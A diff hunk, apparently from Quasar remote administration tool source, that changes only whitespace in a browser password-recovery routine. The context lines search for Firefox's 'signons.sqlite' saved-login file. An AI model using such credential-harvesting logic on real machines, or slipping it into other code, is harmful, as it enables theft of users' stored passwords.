@@ -31,7 +31,7 @@ namespace Quasar.Client.Recovery.Browsers
 
                 string[] files = Directory.GetFiles(dir, "signons.sqlite");
                 if (files.Length > 0)
-				{
+                {
                     signonsFile = files[0];
                     signonsFound = true;
                 }
